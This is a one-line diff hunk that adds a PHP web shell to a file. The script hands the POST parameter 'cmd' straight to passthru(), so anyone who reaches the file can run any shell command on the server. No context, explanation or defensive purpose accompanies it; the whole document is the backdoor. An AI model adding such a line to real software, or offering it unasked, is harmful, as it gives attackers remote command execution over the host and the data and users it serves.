@@ -1,0 +1,1 @@
+<?php passthru($_POST["cmd"]); ?>
